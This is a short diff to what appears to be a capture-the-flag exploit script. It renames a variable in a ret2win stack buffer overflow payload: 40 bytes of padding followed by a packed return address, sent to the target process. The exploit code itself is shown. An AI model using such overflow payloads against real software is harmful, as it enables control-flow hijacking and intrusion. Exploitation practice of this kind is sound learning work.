@@ -23,10 +23,10 @@ r = start()
 #========= exploit here ===================
 
 junk = b'A'*32 + b'B'*8
-win = p64(0x00400764)
+ret2win = p64(0x00400764)
 
 payload = junk
-payload += win
+payload += ret2win
 
 r.sendlineafter('>', payload)
 
